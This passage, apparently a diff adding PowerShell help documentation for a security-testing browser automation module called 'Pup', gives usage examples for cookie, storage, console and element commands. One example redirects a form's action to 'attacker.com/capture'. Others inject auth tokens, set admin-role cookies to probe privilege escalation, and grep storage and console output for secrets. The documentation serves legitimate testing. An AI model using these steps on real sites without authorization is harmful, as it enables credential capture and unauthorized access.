+  <command:command xmlns:maml="http://schemas.microsoft.com/maml/2004/10" xmlns:command="http://schemas.microsoft.com/maml/dev/command/2004/10" xmlns:dev="http://schemas.microsoft.com/maml/dev/2004/10">
+    <command:details>
+      <command:name>Remove-PupPageCookie</command:name>
+      <maml:description>
+        <maml:para>Removes cookies from a page.</maml:para>
+      </maml:description>
+    </command:details>
+    <maml:description>
+      <maml:para>Deletes cookies matching the specified criteria. Useful for testing session handling and logout functionality.</maml:para>
+    </maml:description>
+    <command:examples>
+      <command:example>
+        <maml:title>Example 1: Remove specific cookie</maml:title>
+        <dev:code>Remove-PupPageCookie -Page $page -Name "session" -Domain "target.com"</dev:code>
+        <dev:remarks>
+          <maml:para>Removes the session cookie.</maml:para>
+        </dev:remarks>
+      </command:example>
+      <command:example>
+        <maml:title>Example 2: Test session invalidation</maml:title>
+        <dev:code># Remove session and verify access is denied
+Remove-PupPageCookie -Page $page -Name "auth_token" -Domain "target.com"
+Invoke-PupPageReload -Page $page -WaitForLoad
+# Check if redirected to login</dev:code>
+        <dev:remarks>
+          <maml:para>Tests that removing auth cookie invalidates the session.</maml:para>
+        </dev:remarks>
+      </command:example>
+    </command:examples>
+  </command:command>
+
+  <!-- Get-PupPageConsole -->
+  <command:command xmlns:maml="http://schemas.microsoft.com/maml/2004/10" xmlns:command="http://schemas.microsoft.com/maml/dev/command/2004/10" xmlns:dev="http://schemas.microsoft.com/maml/dev/2004/10">
+    <command:details>
+      <command:name>Get-PupPageConsole</command:name>
+      <maml:description>
+        <maml:para>Gets console messages from a page.</maml:para>
+      </maml:description>
+    </command:details>
+    <maml:description>
+      <maml:para>Returns JavaScript console output including logs, warnings, and errors. Useful for debugging and detecting client-side errors or information disclosure.</maml:para>
+    </maml:description>
+    <command:examples>
+      <command:example>
+        <maml:title>Example 1: Get all console messages</maml:title>
+        <dev:code>$logs = Get-PupPageConsole -Page $page
+$logs | Format-Table Type, Text, Url</dev:code>
+        <dev:remarks>
+          <maml:para>Lists all console output from the page.</maml:para>
+        </dev:remarks>
+      </command:example>
+      <command:example>
+        <maml:title>Example 2: Find errors</maml:title>
+        <dev:code>Get-PupPageConsole -Page $page | Where-Object { $_.Type -eq "Error" }</dev:code>
+        <dev:remarks>
+          <maml:para>Filters for JavaScript errors.</maml:para>
+        </dev:remarks>
+      </command:example>
+      <command:example>
+        <maml:title>Example 3: Look for sensitive data in logs</maml:title>
+        <dev:code>Get-PupPageConsole -Page $page | Where-Object {
+    $_.Text -match "token|password|secret|key|api"
+}</dev:code>
+        <dev:remarks>
+          <maml:para>Searches console output for potentially sensitive information.</maml:para>
+        </dev:remarks>
+      </command:example>
+    </command:examples>
+  </command:command>
+
+  <!-- Get-PupPageScreenshot -->
+  <command:command xmlns:maml="http://schemas.microsoft.com/maml/2004/10" xmlns:command="http://schemas.microsoft.com/maml/dev/command/2004/10" xmlns:dev="http://schemas.microsoft.com/maml/dev/2004/10">
+    <command:details>
+      <command:name>Get-PupPageScreenshot</command:name>
+      <maml:description>
+        <maml:para>Takes a screenshot of the page.</maml:para>
+      </maml:description>
+    </command:details>
+    <maml:description>
+      <maml:para>Captures the current page as a PNG image. Can capture the visible viewport or the full scrollable page.</maml:para>
+    </maml:description>
+    <command:examples>
+      <command:example>
+        <maml:title>Example 1: Save screenshot to file</maml:title>
+        <dev:code>Get-PupPageScreenshot -Page $page -FilePath "evidence.png"</dev:code>
+        <dev:remarks>
+          <maml:para>Saves a screenshot of the visible page.</maml:para>
+        </dev:remarks>
+      </command:example>
+      <command:example>
+        <maml:title>Example 2: Full page screenshot</maml:title>
+        <dev:code>Get-PupPageScreenshot -Page $page -FilePath "full-page.png" -FullPage</dev:code>
+        <dev:remarks>
+          <maml:para>Captures the entire scrollable page.</maml:para>
+        </dev:remarks>
+      </command:example>
+      <command:example>
+        <maml:title>Example 3: Get screenshot as bytes</maml:title>
+        <dev:code>$bytes = Get-PupPageScreenshot -Page $page -PassThru
+[System.IO.File]::WriteAllBytes("screenshot.png", $bytes)</dev:code>
+        <dev:remarks>
+          <maml:para>Returns screenshot data for further processing.</maml:para>
+        </dev:remarks>
+      </command:example>
+    </command:examples>
+  </command:command>
+
+  <!-- Get-PupPageSource -->
+  <command:command xmlns:maml="http://schemas.microsoft.com/maml/2004/10" xmlns:command="http://schemas.microsoft.com/maml/dev/command/2004/10" xmlns:dev="http://schemas.microsoft.com/maml/dev/2004/10">
+    <command:details>
+      <command:name>Get-PupPageSource</command:name>
+      <maml:description>
+        <maml:para>Gets the HTML source of a page.</maml:para>
+      </maml:description>
+    </command:details>
+    <maml:description>
+      <maml:para>Returns the current HTML content of the page, including any dynamic changes made by JavaScript.</maml:para>
+    </maml:description>
+    <command:examples>
+      <command:example>
+        <maml:title>Example 1: Get page source</maml:title>
+        <dev:code>$html = Get-PupPageSource -Page $page
+$html | Out-File "page.html"</dev:code>
+        <dev:remarks>
+          <maml:para>Saves the page HTML to a file.</maml:para>
+        </dev:remarks>
+      </command:example>
+      <command:example>
+        <maml:title>Example 2: Search for comments</maml:title>
+        <dev:code>$html = Get-PupPageSource -Page $page
+[regex]::Matches($html, "&lt;!--.*?--&gt;", "Singleline") | ForEach-Object { $_.Value }</dev:code>
+        <dev:remarks>
+          <maml:para>Extracts HTML comments that might contain sensitive info.</maml:para>
+        </dev:remarks>
+      </command:example>
+      <command:example>
+        <maml:title>Example 3: Find hidden inputs</maml:title>
+        <dev:code>$html = Get-PupPageSource -Page $page
+[regex]::Matches($html, '&lt;input[^&gt;]*type=["\']hidden["\'][^&gt;]*&gt;') | ForEach-Object { $_.Value }</dev:code>
+        <dev:remarks>
+          <maml:para>Finds hidden form fields that might contain tokens or IDs.</maml:para>
+        </dev:remarks>
+      </command:example>
+    </command:examples>
+  </command:command>
+
+  <!-- Send-PupKey -->
+  <command:command xmlns:maml="http://schemas.microsoft.com/maml/2004/10" xmlns:command="http://schemas.microsoft.com/maml/dev/command/2004/10" xmlns:dev="http://schemas.microsoft.com/maml/dev/2004/10">
+    <command:details>
+      <command:name>Send-PupKey</command:name>
+      <maml:description>
+        <maml:para>Sends keyboard input to the page.</maml:para>
+      </maml:description>
+    </command:details>
+    <maml:description>
+      <maml:para>Simulates keyboard input by pressing keys or typing text. Can combine with modifier keys (Ctrl, Alt, Shift).</maml:para>
+    </maml:description>
+    <command:examples>
+      <command:example>
+        <maml:title>Example 1: Type text</maml:title>
+        <dev:code>$input = Find-PupElements -Page $page -Selector "#search" -First
+$input | Invoke-PupElementFocus
+Send-PupKey -Page $page -Text "search query"</dev:code>
+        <dev:remarks>
+          <maml:para>Types text into the focused element.</maml:para>
+        </dev:remarks>
+      </command:example>
+      <command:example>
+        <maml:title>Example 2: Press Enter to submit</maml:title>
+        <dev:code>Send-PupKey -Page $page -Key "Enter"</dev:code>
+        <dev:remarks>
+          <maml:para>Presses the Enter key to submit a form.</maml:para>
+        </dev:remarks>
+      </command:example>
+      <command:example>
+        <maml:title>Example 3: Keyboard shortcut</maml:title>
+        <dev:code>Send-PupKey -Page $page -Key "a" -Modifiers "Control"</dev:code>
+        <dev:remarks>
+          <maml:para>Sends Ctrl+A to select all.</maml:para>
+        </dev:remarks>
+      </command:example>
+      <command:example>
+        <maml:title>Example 4: Navigate with Tab</maml:title>
+        <dev:code>Send-PupKey -Page $page -Key "Tab"
+Send-PupKey -Page $page -Key "Tab"
+Send-PupKey -Page $page -Key "Enter"</dev:code>
+        <dev:remarks>
+          <maml:para>Uses Tab to navigate form fields.</maml:para>
+        </dev:remarks>
+      </command:example>
+    </command:examples>
+  </command:command>
+
+  <!-- Set-PupDialogHandler -->
+  <command:command xmlns:maml="http://schemas.microsoft.com/maml/2004/10" xmlns:command="http://schemas.microsoft.com/maml/dev/command/2004/10" xmlns:dev="http://schemas.microsoft.com/maml/dev/2004/10">
+    <command:details>
+      <command:name>Set-PupDialogHandler</command:name>
+      <maml:description>
+        <maml:para>Configures automatic handling of browser dialogs.</maml:para>
+      </maml:description>
+    </command:details>
+    <maml:description>
+      <maml:para>Sets up automatic responses to JavaScript alert(), confirm(), and prompt() dialogs. Without a handler, dialogs will block automation.</maml:para>
+    </maml:description>
+    <command:examples>
+      <command:example>
+        <maml:title>Example 1: Accept all dialogs</maml:title>
+        <dev:code>Set-PupDialogHandler -Page $page -Action Accept</dev:code>
+        <dev:remarks>
+          <maml:para>Automatically clicks OK/Accept on all dialogs.</maml:para>
+        </dev:remarks>
+      </command:example>
+      <command:example>
+        <maml:title>Example 2: Dismiss dialogs</maml:title>
+        <dev:code>Set-PupDialogHandler -Page $page -Action Dismiss</dev:code>
+        <dev:remarks>
+          <maml:para>Automatically clicks Cancel/Dismiss on all dialogs.</maml:para>
+        </dev:remarks>
+      </command:example>
+      <command:example>
+        <maml:title>Example 3: Handle prompt with text</maml:title>
+        <dev:code>Set-PupDialogHandler -Page $page -Action Accept -PromptText "user input"</dev:code>
+        <dev:remarks>
+          <maml:para>Accepts prompts and enters the specified text.</maml:para>
+        </dev:remarks>
+      </command:example>
+      <command:example>
+        <maml:title>Example 4: Remove handler</maml:title>
+        <dev:code>Set-PupDialogHandler -Page $page -Remove</dev:code>
+        <dev:remarks>
+          <maml:para>Removes the dialog handler.</maml:para>
+        </dev:remarks>
+      </command:example>
+    </command:examples>
+  </command:command>
+
+  <!-- Select-PupElementOption -->
+  <command:command xmlns:maml="http://schemas.microsoft.com/maml/2004/10" xmlns:command="http://schemas.microsoft.com/maml/dev/command/2004/10" xmlns:dev="http://schemas.microsoft.com/maml/dev/2004/10">
+    <command:details>
+      <command:name>Select-PupElementOption</command:name>
+      <maml:description>
+        <maml:para>Selects options in a dropdown/select element.</maml:para>
+      </maml:description>
+    </command:details>
+    <maml:description>
+      <maml:para>Selects one or more options in a select element by value, visible text, or index. Can also list all available options.</maml:para>
+    </maml:description>
+    <command:examples>
+      <command:example>
+        <maml:title>Example 1: List available options</maml:title>
+        <dev:code>$select = Find-PupElements -Page $page -Selector "#country" -First
+Select-PupElementOption -Element $select -List</dev:code>
+        <dev:remarks>
+          <maml:para>Shows all options in the dropdown.</maml:para>
+        </dev:remarks>
+      </command:example>
+      <command:example>
+        <maml:title>Example 2: Select by value</maml:title>
+        <dev:code>$select = Find-PupElements -Page $page -Selector "#country" -First
+Select-PupElementOption -Element $select -Value "US"</dev:code>
+        <dev:remarks>
+          <maml:para>Selects the option with value "US".</maml:para>
+        </dev:remarks>
+      </command:example>
+      <command:example>
+        <maml:title>Example 3: Select by visible text</maml:title>
+        <dev:code>$select = Find-PupElements -Page $page -Selector "#role" -First
+Select-PupElementOption -Element $select -Text "Administrator"</dev:code>
+        <dev:remarks>
+          <maml:para>Selects the option showing "Administrator".</maml:para>
+        </dev:remarks>
+      </command:example>
+      <command:example>
+        <maml:title>Example 4: Multi-select</maml:title>
+        <dev:code>$select = Find-PupElements -Page $page -Selector "#permissions" -First
+Select-PupElementOption -Element $select -Value "read", "write", "delete"</dev:code>
+        <dev:remarks>
+          <maml:para>Selects multiple options in a multi-select element.</maml:para>
+        </dev:remarks>
+      </command:example>
+    </command:examples>
+  </command:command>
+
+  <!-- Get-PupPageStorage -->
+  <command:command xmlns:maml="http://schemas.microsoft.com/maml/2004/10" xmlns:command="http://schemas.microsoft.com/maml/dev/command/2004/10" xmlns:dev="http://schemas.microsoft.com/maml/dev/2004/10">
+    <command:details>
+      <command:name>Get-PupPageStorage</command:name>
+      <maml:description>
+        <maml:para>Gets localStorage or sessionStorage data from a page.</maml:para>
+      </maml:description>
+    </command:details>
+    <maml:description>
+      <maml:para>Retrieves data stored in the browser's localStorage or sessionStorage. Useful for inspecting client-side data storage for sensitive information.</maml:para>
+    </maml:description>
+    <command:examples>
+      <command:example>
+        <maml:title>Example 1: Get all localStorage</maml:title>
+        <dev:code>Get-PupPageStorage -Page $page -Type Local</dev:code>
+        <dev:remarks>
+          <maml:para>Returns all localStorage key-value pairs.</maml:para>
+        </dev:remarks>
+      </command:example>
+      <command:example>
+        <maml:title>Example 2: Get specific key</maml:title>
+        <dev:code>Get-PupPageStorage -Page $page -Type Local -Key "authToken"</dev:code>
+        <dev:remarks>
+          <maml:para>Gets a specific storage value.</maml:para>
+        </dev:remarks>
+      </command:example>
+      <command:example>
+        <maml:title>Example 3: Check for sensitive data</maml:title>
+        <dev:code>$storage = Get-PupPageStorage -Page $page -Type Local
+$storage | Where-Object { $_.Key -match "token|auth|session|password" }</dev:code>
+        <dev:remarks>
+          <maml:para>Searches storage for potentially sensitive keys.</maml:para>
+        </dev:remarks>
+      </command:example>
+    </command:examples>
+  </command:command>
+
+  <!-- Set-PupPageStorage -->
+  <command:command xmlns:maml="http://schemas.microsoft.com/maml/2004/10" xmlns:command="http://schemas.microsoft.com/maml/dev/command/2004/10" xmlns:dev="http://schemas.microsoft.com/maml/dev/2004/10">
+    <command:details>
+      <command:name>Set-PupPageStorage</command:name>
+      <maml:description>
+        <maml:para>Sets localStorage or sessionStorage data on a page.</maml:para>
+      </maml:description>
+    </command:details>
+    <maml:description>
+      <maml:para>Stores data in the browser's localStorage or sessionStorage. Can set individual keys or multiple key-value pairs at once.</maml:para>
+    </maml:description>
+    <command:examples>
+      <command:example>
+        <maml:title>Example 1: Set a storage value</maml:title>
+        <dev:code>Set-PupPageStorage -Page $page -Type Local -Key "theme" -Value "dark"</dev:code>
+        <dev:remarks>
+          <maml:para>Sets a single localStorage value.</maml:para>
+        </dev:remarks>
+      </command:example>
+      <command:example>
+        <maml:title>Example 2: Inject auth token</maml:title>
+        <dev:code>Set-PupPageStorage -Page $page -Type Local -Key "authToken" -Value "eyJhbGc..."
+Invoke-PupPageReload -Page $page -WaitForLoad</dev:code>
+        <dev:remarks>
+          <maml:para>Injects an authentication token and reloads to test access.</maml:para>
+        </dev:remarks>
+      </command:example>
+      <command:example>
+        <maml:title>Example 3: Set multiple values</maml:title>
+        <dev:code>Set-PupPageStorage -Page $page -Type Session -Items @{
+    "userId" = "admin"
+    "role" = "administrator"
+}</dev:code>
+        <dev:remarks>
+          <maml:para>Sets multiple sessionStorage values at once.</maml:para>
+        </dev:remarks>
+      </command:example>
+    </command:examples>
+  </command:command>
+
+  <!-- Invoke-PupPageReload -->
+  <command:command xmlns:maml="http://schemas.microsoft.com/maml/2004/10" xmlns:command="http://schemas.microsoft.com/maml/dev/command/2004/10" xmlns:dev="http://schemas.microsoft.com/maml/dev/2004/10">
+    <command:details>
+      <command:name>Invoke-PupPageReload</command:name>
+      <maml:description>
+        <maml:para>Reloads the current page.</maml:para>
+      </maml:description>
+    </command:details>
+    <maml:description>
+      <maml:para>Refreshes the page, optionally waiting for the reload to complete. Useful after modifying cookies or storage.</maml:para>
+    </maml:description>
+    <command:examples>
+      <command:example>
+        <maml:title>Example 1: Reload and wait</maml:title>
+        <dev:code>Invoke-PupPageReload -Page $page -WaitForLoad</dev:code>
+        <dev:remarks>
+          <maml:para>Reloads the page and waits for it to fully load.</maml:para>
+        </dev:remarks>
+      </command:example>
+      <command:example>
+        <maml:title>Example 2: Test after modifying session</maml:title>
+        <dev:code>Set-PupPageCookie -Page $page -Name "role" -Value "admin" -Domain "target.com"
+Invoke-PupPageReload -Page $page -WaitForLoad
+# Check if admin features are now visible</dev:code>
+        <dev:remarks>
+          <maml:para>Reloads after cookie manipulation to test privilege escalation.</maml:para>
+        </dev:remarks>
+      </command:example>
+    </command:examples>
+  </command:command>
+
+  <!-- Install-PupBrowser -->
+  <command:command xmlns:maml="http://schemas.microsoft.com/maml/2004/10" xmlns:command="http://schemas.microsoft.com/maml/dev/command/2004/10" xmlns:dev="http://schemas.microsoft.com/maml/dev/2004/10">
+    <command:details>
+      <command:name>Install-PupBrowser</command:name>
+      <maml:description>
+        <maml:para>Downloads and installs a browser for automation.</maml:para>
+      </maml:description>
+    </command:details>
+    <maml:description>
+      <maml:para>Downloads a Chromium-based browser to use with Pup. Must be run before starting a browser for the first time.</maml:para>
+    </maml:description>
+    <command:examples>
+      <command:example>
+        <maml:title>Example 1: Install Chrome</maml:title>
+        <dev:code>Install-PupBrowser -BrowserType Chrome</dev:code>
+        <dev:remarks>
+          <maml:para>Downloads and installs Chrome for automation.</maml:para>
+        </dev:remarks>
+      </command:example>
+      <command:example>
+        <maml:title>Example 2: Install specific version</maml:title>
+        <dev:code>Install-PupBrowser -BrowserType Chrome -Revision 1234567</dev:code>
+        <dev:remarks>
+          <maml:para>Installs a specific browser revision.</maml:para>
+        </dev:remarks>
+      </command:example>
+    </command:examples>
+  </command:command>
+
+  <!-- Uninstall-PupBrowser -->
+  <command:command xmlns:maml="http://schemas.microsoft.com/maml/2004/10" xmlns:command="http://schemas.microsoft.com/maml/dev/command/2004/10" xmlns:dev="http://schemas.microsoft.com/maml/dev/2004/10">
+    <command:details>
+      <command:name>Uninstall-PupBrowser</command:name>
+      <maml:description>
+        <maml:para>Removes an installed browser.</maml:para>
+      </maml:description>
+    </command:details>
+    <maml:description>
+      <maml:para>Removes a previously installed browser and frees disk space.</maml:para>
+    </maml:description>
+    <command:examples>
+      <command:example>
+        <maml:title>Example 1: Uninstall Chrome</maml:title>
+        <dev:code>Uninstall-PupBrowser -BrowserType Chrome</dev:code>
+        <dev:remarks>
+          <maml:para>Removes the installed Chrome browser.</maml:para>
+        </dev:remarks>
+      </command:example>
+    </command:examples>
+  </command:command>
+
+  <!-- Invoke-PupPageBack -->
+  <command:command xmlns:maml="http://schemas.microsoft.com/maml/2004/10" xmlns:command="http://schemas.microsoft.com/maml/dev/command/2004/10" xmlns:dev="http://schemas.microsoft.com/maml/dev/2004/10">
+    <command:details>
+      <command:name>Invoke-PupPageBack</command:name>
+      <maml:description>
+        <maml:para>Navigates the page back in history.</maml:para>
+      </maml:description>
+    </command:details>
+    <maml:description>
+      <maml:para>Simulates clicking the browser back button. Navigates to the previous page in the browsing history.</maml:para>
+    </maml:description>
+    <command:examples>
+      <command:example>
+        <maml:title>Example 1: Go back</maml:title>
+        <dev:code>Invoke-PupPageBack -Page $page -WaitForLoad</dev:code>
+        <dev:remarks>
+          <maml:para>Navigates back and waits for the page to load.</maml:para>
+        </dev:remarks>
+      </command:example>
+      <command:example>
+        <maml:title>Example 2: Test back navigation after form submit</maml:title>
+        <dev:code># Submit a form, then go back to check if data persists
+Invoke-PupPageBack -Page $page -WaitForLoad
+$input = Find-PupElements -Page $page -Selector "#username" -First
+$input.Value  # Check if form data is still there</dev:code>
+        <dev:remarks>
+          <maml:para>Tests form data persistence across back navigation.</maml:para>
+        </dev:remarks>
+      </command:example>
+    </command:examples>
+  </command:command>
+
+  <!-- Invoke-PupPageForward -->
+  <command:command xmlns:maml="http://schemas.microsoft.com/maml/2004/10" xmlns:command="http://schemas.microsoft.com/maml/dev/command/2004/10" xmlns:dev="http://schemas.microsoft.com/maml/dev/2004/10">
+    <command:details>
+      <command:name>Invoke-PupPageForward</command:name>
+      <maml:description>
+        <maml:para>Navigates the page forward in history.</maml:para>
+      </maml:description>
+    </command:details>
+    <maml:description>
+      <maml:para>Simulates clicking the browser forward button. Navigates to the next page in the browsing history.</maml:para>
+    </maml:description>
+    <command:examples>
+      <command:example>
+        <maml:title>Example 1: Go forward</maml:title>
+        <dev:code>Invoke-PupPageForward -Page $page -WaitForLoad</dev:code>
+        <dev:remarks>
+          <maml:para>Navigates forward and waits for the page to load.</maml:para>
+        </dev:remarks>
+      </command:example>
+    </command:examples>
+  </command:command>
+
+  <!-- Export-PupPagePdf -->
+  <command:command xmlns:maml="http://schemas.microsoft.com/maml/2004/10" xmlns:command="http://schemas.microsoft.com/maml/dev/command/2004/10" xmlns:dev="http://schemas.microsoft.com/maml/dev/2004/10">
+    <command:details>
+      <command:name>Export-PupPagePdf</command:name>
+      <maml:description>
+        <maml:para>Exports the page as a PDF document.</maml:para>
+      </maml:description>
+    </command:details>
+    <maml:description>
+      <maml:para>Generates a PDF of the current page. Useful for creating documentation or evidence during security assessments.</maml:para>
+    </maml:description>
+    <command:examples>
+      <command:example>
+        <maml:title>Example 1: Save page as PDF</maml:title>
+        <dev:code>Export-PupPagePdf -Page $page -FilePath "evidence.pdf"</dev:code>
+        <dev:remarks>
+          <maml:para>Exports the page to a PDF file.</maml:para>
+        </dev:remarks>
+      </command:example>
+      <command:example>
+        <maml:title>Example 2: Get PDF as bytes</maml:title>
+        <dev:code>$bytes = Export-PupPagePdf -Page $page -PassThru
+[System.IO.File]::WriteAllBytes("report.pdf", $bytes)</dev:code>
+        <dev:remarks>
+          <maml:para>Returns PDF data for further processing.</maml:para>
+        </dev:remarks>
+      </command:example>
+      <command:example>
+        <maml:title>Example 3: Custom PDF settings</maml:title>
+        <dev:code>Export-PupPagePdf -Page $page -FilePath "report.pdf" -Landscape -PrintBackground</dev:code>
+        <dev:remarks>
+          <maml:para>Exports with landscape orientation and background colors.</maml:para>
+        </dev:remarks>
+      </command:example>
+    </command:examples>
+  </command:command>
+
+  <!-- Clear-PupPageStorage -->
+  <command:command xmlns:maml="http://schemas.microsoft.com/maml/2004/10" xmlns:command="http://schemas.microsoft.com/maml/dev/command/2004/10" xmlns:dev="http://schemas.microsoft.com/maml/dev/2004/10">
+    <command:details>
+      <command:name>Clear-PupPageStorage</command:name>
+      <maml:description>
+        <maml:para>Clears localStorage or sessionStorage data.</maml:para>
+      </maml:description>
+    </command:details>
+    <maml:description>
+      <maml:para>Removes data from the browser's localStorage or sessionStorage. Can clear all data or specific keys.</maml:para>
+    </maml:description>
+    <command:examples>
+      <command:example>
+        <maml:title>Example 1: Clear all localStorage</maml:title>
+        <dev:code>Clear-PupPageStorage -Page $page -Type Local</dev:code>
+        <dev:remarks>
+          <maml:para>Removes all localStorage data.</maml:para>
+        </dev:remarks>
+      </command:example>
+      <command:example>
+        <maml:title>Example 2: Clear specific key</maml:title>
+        <dev:code>Clear-PupPageStorage -Page $page -Type Local -Key "authToken"</dev:code>
+        <dev:remarks>
+          <maml:para>Removes only the specified key.</maml:para>
+        </dev:remarks>
+      </command:example>
+      <command:example>
+        <maml:title>Example 3: Test logout functionality</maml:title>
+        <dev:code># Clear all client-side storage and verify logout
+Clear-PupPageStorage -Page $page -Type Local
+Clear-PupPageStorage -Page $page -Type Session
+Invoke-PupPageReload -Page $page -WaitForLoad
+# Check if user is logged out</dev:code>
+        <dev:remarks>
+          <maml:para>Tests that clearing storage properly logs out the user.</maml:para>
+        </dev:remarks>
+      </command:example>
+    </command:examples>
+  </command:command>
+
+  <!-- Get-PupElementAttribute -->
+  <command:command xmlns:maml="http://schemas.microsoft.com/maml/2004/10" xmlns:command="http://schemas.microsoft.com/maml/dev/command/2004/10" xmlns:dev="http://schemas.microsoft.com/maml/dev/2004/10">
+    <command:details>
+      <command:name>Get-PupElementAttribute</command:name>
+      <maml:description>
+        <maml:para>Gets an attribute value from an element.</maml:para>
+      </maml:description>
+    </command:details>
+    <maml:description>
+      <maml:para>Retrieves the value of a specific HTML attribute from an element. Useful for extracting data attributes, href values, or other element metadata.</maml:para>
+    </maml:description>
+    <command:examples>
+      <command:example>
+        <maml:title>Example 1: Get href attribute</maml:title>
+        <dev:code>$link = Find-PupElements -Page $page -Selector "a.download" -First
+Get-PupElementAttribute -Element $link -Name "href"</dev:code>
+        <dev:remarks>
+          <maml:para>Gets the URL from a link element.</maml:para>
+        </dev:remarks>
+      </command:example>
+      <command:example>
+        <maml:title>Example 2: Extract data attributes</maml:title>
+        <dev:code>$el = Find-PupElements -Page $page -Selector "[data-user-id]" -First
+$userId = Get-PupElementAttribute -Element $el -Name "data-user-id"</dev:code>
+        <dev:remarks>
+          <maml:para>Extracts custom data attributes.</maml:para>
+        </dev:remarks>
+      </command:example>
+      <command:example>
+        <maml:title>Example 3: Check for target="_blank"</maml:title>
+        <dev:code>$links = Find-PupElements -Page $page -Selector "a"
+$links | ForEach-Object {
+    $target = Get-PupElementAttribute -Element $_ -Name "target"
+    $rel = Get-PupElementAttribute -Element $_ -Name "rel"
+    if ($target -eq "_blank" -and $rel -notlike "*noopener*") {
+        "Vulnerable link: $(Get-PupElementAttribute -Element $_ -Name 'href')"
+    }
+}</dev:code>
+        <dev:remarks>
+          <maml:para>Finds links vulnerable to reverse tabnabbing.</maml:para>
+        </dev:remarks>
+      </command:example>
+    </command:examples>
+  </command:command>
+
+  <!-- Set-PupElementAttribute -->
+  <command:command xmlns:maml="http://schemas.microsoft.com/maml/2004/10" xmlns:command="http://schemas.microsoft.com/maml/dev/command/2004/10" xmlns:dev="http://schemas.microsoft.com/maml/dev/2004/10">
+    <command:details>
+      <command:name>Set-PupElementAttribute</command:name>
+      <maml:description>
+        <maml:para>Sets an attribute value on an element.</maml:para>
+      </maml:description>
+    </command:details>
+    <maml:description>
+      <maml:para>Sets or modifies an HTML attribute on an element. Can be used to manipulate form fields, change links, or modify element behavior.</maml:para>
+    </maml:description>
+    <command:examples>
+      <command:example>
+        <maml:title>Example 1: Change form action</maml:title>
+        <dev:code>$form = Find-PupElements -Page $page -Selector "form" -First
+Set-PupElementAttribute -Element $form -Name "action" -Value "https://attacker.com/capture"</dev:code>
+        <dev:remarks>
+          <maml:para>Modifies the form submission target.</maml:para>
+        </dev:remarks>
+      </command:example>
+      <command:example>
+        <maml:title>Example 2: Remove disabled attribute</maml:title>
+        <dev:code>$btn = Find-PupElements -Page $page -Selector "#submit-btn" -First
+Set-PupElementAttribute -Element $btn -Name "disabled" -Remove</dev:code>
+        <dev:remarks>
+          <maml:para>Enables a disabled button for testing.</maml:para>
+        </dev:remarks>
+      </command:example>
+      <command:example>
+        <maml:title>Example 3: Modify input type</maml:title>
+        <dev:code>$input = Find-PupElements -Page $page -Selector "input[type=hidden]" -First
+Set-PupElementAttribute -Element $input -Name "type" -Value "text"</dev:code>
+        <dev:remarks>
+          <maml:para>Changes hidden input to visible for inspection.</maml:para>
+        </dev:remarks>
+      </command:example>
+    </command:examples>
+  </command:command>
+
+  <!-- Get-PupElementText -->
+  <command:command xmlns:maml="http://schemas.microsoft.com/maml/2004/10" xmlns:command="http://schemas.microsoft.com/maml/dev/command/2004/10" xmlns:dev="http://schemas.microsoft.com/maml/dev/2004/10">
+    <command:details>
+      <command:name>Get-PupElementText</command:name>
+      <maml:description>
+        <maml:para>Gets the text content of an element.</maml:para>
+      </maml:description>
+    </command:details>
+    <maml:description>
+      <maml:para>Returns the visible text content of an element, including text from child elements.</maml:para>
+    </maml:description>
+    <command:examples>
+      <command:example>
+        <maml:title>Example 1: Get button text</maml:title>
+        <dev:code>$btn = Find-PupElements -Page $page -Selector ".submit-btn" -First
+Get-PupElementText -Element $btn</dev:code>
+        <dev:remarks>
+          <maml:para>Gets the text displayed on a button.</maml:para>
+        </dev:remarks>
+      </command:example>
+      <command:example>
+        <maml:title>Example 2: Extract error messages</maml:title>
+        <dev:code>$errors = Find-PupElements -Page $page -Selector ".error-message"
+$errors | ForEach-Object { Get-PupElementText -Element $_ }</dev:code>
+        <dev:remarks>
+          <maml:para>Extracts all error messages from the page.</maml:para>
+        </dev:remarks>
+      </command:example>
+    </command:examples>
+  </command:command>
+
+  <!-- Invoke-PupElementFocus -->
+  <command:command xmlns:maml="http://schemas.microsoft.com/maml/2004/10" xmlns:command="http://schemas.microsoft.com/maml/dev/command/2004/10" xmlns:dev="http://schemas.microsoft.com/maml/dev/2004/10">
+    <command:details>
+      <command:name>Invoke-PupElementFocus</command:name>
+      <maml:description>
+        <maml:para>Sets focus on an element.</maml:para>
+      </maml:description>
+    </command:details>
+    <maml:description>
+      <maml:para>Gives keyboard focus to an element. Required before sending keyboard input to a specific element.</maml:para>
+    </maml:description>
+    <command:examples>
+      <command:example>
+        <maml:title>Example 1: Focus input before typing</maml:title>
+        <dev:code>$input = Find-PupElements -Page $page -Selector "#search" -First
+$input | Invoke-PupElementFocus
+Send-PupKey -Page $page -Text "search query"</dev:code>
+        <dev:remarks>
+          <maml:para>Focuses an input field before typing into it.</maml:para>
+        </dev:remarks>
+      </command:example>
+      <command:example>
+        <maml:title>Example 2: Test autofocus behavior</maml:title>
+        <dev:code>$input = Find-PupElements -Page $page -Selector "#password" -First
+$input | Invoke-PupElementFocus
+# Check if any autocomplete values appear</dev:code>
+        <dev:remarks>
+          <maml:para>Focuses password field to test for autocomplete behavior.</maml:para>
+        </dev:remarks>
+      </command:example>
+    </command:examples>
+  </command:command>
+
+  <!-- Invoke-PupElementHover -->
+  <command:command xmlns:maml="http://schemas.microsoft.com/maml/2004/10" xmlns:command="http://schemas.microsoft.com/maml/dev/command/2004/10" xmlns:dev="http://schemas.microsoft.com/maml/dev/2004/10">
+    <command:details>
+      <command:name>Invoke-PupElementHover</command:name>
+      <maml:description>
+        <maml:para>Hovers the mouse over an element.</maml:para>
+      </maml:description>
+    </command:details>
+    <maml:description>
+      <maml:para>Simulates moving the mouse over an element. Triggers hover states, tooltips, and dropdown menus.</maml:para>
+    </maml:description>
+    <command:examples>
+      <command:example>
+        <maml:title>Example 1: Trigger dropdown menu</maml:title>
+        <dev:code>$menu = Find-PupElements -Page $page -Selector ".dropdown-trigger" -First
+$menu | Invoke-PupElementHover
+Start-Sleep -Milliseconds 500
+$item = Find-PupElements -Page $page -Selector ".dropdown-item.admin" -First
+$item | Invoke-PupElementClick</dev:code>
+        <dev:remarks>
+          <maml:para>Hovers to open a dropdown menu, then clicks an item.</maml:para>
+        </dev:remarks>
+      </command:example>
+      <command:example>
+        <maml:title>Example 2: Capture tooltip content</maml:title>
+        <dev:code>$el = Find-PupElements -Page $page -Selector "[data-tooltip]" -First
+$el | Invoke-PupElementHover
+Start-Sleep -Milliseconds 300
+$tooltip = Find-PupElements -Page $page -Selector ".tooltip" -First
+Get-PupElementText -Element $tooltip</dev:code>
+        <dev:remarks>
+          <maml:para>Triggers and captures tooltip text.</maml:para>
